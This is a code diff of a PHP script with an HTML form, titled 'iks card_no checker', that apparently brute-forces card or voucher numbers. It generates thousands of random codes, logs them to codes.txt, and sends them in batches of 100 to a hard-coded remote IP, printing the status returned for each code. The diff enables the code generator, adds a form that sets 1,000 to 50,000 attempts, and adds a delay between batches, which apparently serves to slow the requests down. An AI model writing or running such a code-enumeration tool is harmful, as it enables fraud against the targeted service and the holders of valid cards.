@@ -1,93 +1,117 @@
+<!DOCTYPE html>
+<html>
+     
+<head>
+    <title>
+        iks checker by kalou
+    </title>
+</head>
+ 
+<body style="text-align:center;">
+     
+    <h1 style="color:green;">
+        iks card_no checker
+    </h1>
+     
+    <form method="post" >
+        <input type="number" id="repeat" name="repeat" min="1000" max="50000" value="1000" step="100">
+        <input type="submit" name="check" value="check"/>
+    </form>
+</head>
+ 
+</html>
+
+
 <?php
 set_time_limit(0);
-// function randPass($length, $strength=8) {
-//     $vowels = 'aeuy';
-//     $consonants = 'bdghjmnpqrstvz';
-//     if ($strength >= 1) {
-//         $consonants .= 'BDGHJLMNPQRSTVWXZ';
-//     }
-//     if ($strength >= 2) {
-//         $vowels .= "AEUY";
-//     }
-//     if ($strength >= 4) {
-//         $consonants .= '0123456789';
-//     }
-//     if ($strength >= 8) {
-//         $consonants .= '-=+.';
-//     }
+function randPass($length, $strength=8) {
+    $vowels = 'aeuy';
+    $consonants = 'bdghjmnpqrstvz';
+    if ($strength >= 1) {
+        $consonants .= 'BDGHJLMNPQRSTVWXZ';
+    }
+    if ($strength >= 2) {
+        $vowels .= "AEUY";
+    }
+    if ($strength >= 4) {
+        $consonants .= '0123456789';
+    }
+    if ($strength >= 8) {
+        $consonants .= '-=+.';
+    }
 
-//     $password = '';
-//     $alt = time() % 2;
-//         for ($i = 0; $i < $length; $i++) {
-//             if ($alt == 1) {
-//                 $password .= $consonants[(rand() % strlen($consonants))];
-//                 $alt = 0;
-//             } else {
-//                 $password .= $vowels[(rand() % strlen($vowels))];
-//                 $alt = 1;
-//             }
-//         }
-//     return $password;   
-// }
+    $password = '';
+    $alt = time() % 2;
+        for ($i = 0; $i < $length; $i++) {
+            if ($alt == 1) {
+                $password .= $consonants[(rand() % strlen($consonants))];
+                $alt = 0;
+            } else {
+                $password .= $vowels[(rand() % strlen($vowels))];
+                $alt = 1;
+            }
+        }
+    return $password;   
+}
 
-// function generateRandom($length = 10) {
+function generateRandom($length = 10) {
 
-//     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 
-//     $specials = '=+-_.';
+    $specials = '=+-_.';
 
-//     $charactersLength = strlen($characters);
+    $charactersLength = strlen($characters);
 
-//     $randomString = '';
+    $randomString = '';
 
-//     // Removed one from length to maintain desired length
+    // Removed one from length to maintain desired length
 
-//     // for special character addition
+    // for special character addition
 
-//     for ($i = 0; $i < $length - 1; $i++) {
+    for ($i = 0; $i < $length - 1; $i++) {
 
-//         $randomString .= $characters[rand(0, $charactersLength - 1)];
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
 
-//     }
+    }
 
-//     // Add the special character:
+    // Add the special character:
 
-//     $randomString .= $specials[rand(0, strlen($specials) - 1)];
+    $randomString .= $specials[rand(0, strlen($specials) - 1)];
 
-//     // Shuffle the returned string so the special is not always at the end
+    // Shuffle the returned string so the special is not always at the end
 
-//     return str_shuffle($randomString);
+    return str_shuffle($randomString);
 
-// }
+}
 
-// function genCodes($number){
-//     $code_no = array();
-//     while(count($code_no)<=$number){
-//         $codeX = randPass(14);
-//         // $codeX = generateRandom(14);
+function genCodes($number){
+    $code_no = array();
+    while(count($code_no)<=$number){
+        $codeX = 'I'.randPass(14);
+        // $codeX = generateRandom(14);
 
-//         if(preg_match('/[^A-Za-z0-9]/', $codeX)){
-//             if(getLineWithString($codeX) == -1){
-//                 array_push($code_no,'S'.$codeX);
-//                 $file = fopen('codes.txt', 'a+');
-//                 fwrite($file, 'S'.$codeX.PHP_EOL);
-//                 fclose($file);
-//             }
-//         }
-//     }
-// }
+        if(preg_match('/[^A-Za-z0-9]/', $codeX)){
+            if(getLineWithString($codeX) == -1){
+                array_push($code_no,$codeX);
+                $file = fopen('codes.txt', 'a+');
+                fwrite($file, $codeX.PHP_EOL);
+                fclose($file);
+            }
+        }
+    }
+}
 
-// function getLineWithString($str) {
-//     $lines = file('codes.txt');  
-//     if($lines !== ''){
-//         foreach ($lines as $line) {
-//             if (strpos($line, $str) !== false) {
-//                 return $line;
-//             }
-//         }
-//     }
-//     return -1;
-// }
+function getLineWithString($str) {
+    $lines = file('codes.txt');  
+    if($lines !== ''){
+        foreach ($lines as $line) {
+            if (strpos($line, $str) !== false) {
+                return $line;
+            }
+        }
+    }
+    return -1;
+}
 
 function api($checkCodes){
     $url = 'http://45.91.82.31/';
@@ -241,6 +265,7 @@ function execute($number=0){
     $multiArrayCode = array_chunk($checkCodes, 100);
     foreach ($multiArrayCode as $keyX => $codes) {
         $response = php_curl_multi($codes);
+        sleep(2);
         foreach ($response as $key => $value) {
             $start = stripos($value, "document.getElementById('prompt').innerHTML");
             $end = stripos($value, "</body>");
@@ -257,12 +282,15 @@ function execute($number=0){
                 print_r(['code'=>$codes[$key],'status'=>$body]);
                 echo '<br>';
             }
-            // echo $key;
+
             if($number == $key+1*$keyX+1){
+                ob_start();
+                echo 'vip iks is end';  
                 // some statement that removes all printed/echoed items
-                // ob_end_clean();
-                echo 'vip iks is end';
+                ob_end_clean();
             }
+                print_r(['code'=>$codes[$key],'status'=>$body]);
+                echo '<br>';
         }
     }
 }
@@ -280,9 +308,13 @@ function changeCode($newKey){
     fclose($fp);
 }
 
-// changeCode('I');
-execute(1000);
-// ob_start();
-echo 'vip iks is runing';
 
 
+if(isset($_POST['check'])) {
+    if(isset($_POST['repeat'])){
+        echo 'vip iks is runing => '.$_POST['repeat'].' time <br>';   
+        execute($_POST['repeat']);
+    }
+    // changeCode('I');
+    // genCodes(10000);
+}
